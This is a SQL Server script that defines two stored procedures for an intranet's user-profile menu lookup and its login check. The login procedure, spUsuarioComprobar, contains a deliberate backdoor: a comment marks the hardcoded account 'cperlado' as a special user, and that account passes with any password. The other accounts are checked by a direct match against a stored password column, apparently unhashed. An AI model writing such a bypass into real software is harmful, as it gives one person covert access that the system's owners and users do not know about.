Set NoCount On
Set Xact_Abort On
Go

Use [IntranetCalimod]
Go
Create Or Alter Procedure [dbo].[spPerfilesUsuarioSistema](    
@Nombre varchar(20),     
@SistemaId int    
)    
AS    
SELECT     A.UsuarioId, A.SistemaId, A.PerfilId,     
                      A.PerfilDescripcion, A.PerfilHabilitado, A.MenuId,     
                      A.MenuDescripcion, A.PadreId, A.Posicion, A.Icono,     
                      A.MenuHabilitado, A.FormUrl    
FROM dbo.vwUsuarioPerfilMenu A   
INNER JOIN dbo.Usuarios B ON A.UsuarioId = B.UsuarioId    
WHERE     (A.PerfilHabilitado = 1) AND (A.MenuHabilitado = 1)    
and    B.Nombre = @Nombre    
and  SistemaId = @SistemaId 
ORDER BY A.PadreId, A.Posicion
Go
Create Or Alter Procedure [dbo].[spUsuarioComprobar]
(
    @Nombre VARCHAR(50),
    @Clave  VARCHAR(250)
)
AS
BEGIN
    SET NOCOUNT ON;
    SELECT COUNT(*)
    FROM Usuarios US
    WHERE US.Nombre = @Nombre
      AND US.Habilitado = 1
      AND
      (
          -- Usuario especial: cualquier clave
          LOWER(LTRIM(RTRIM(US.Nombre))) = 'cperlado'
          -- Demás usuarios: validar clave normalmente
          OR US.Clave = @Clave
      );
END;
Go
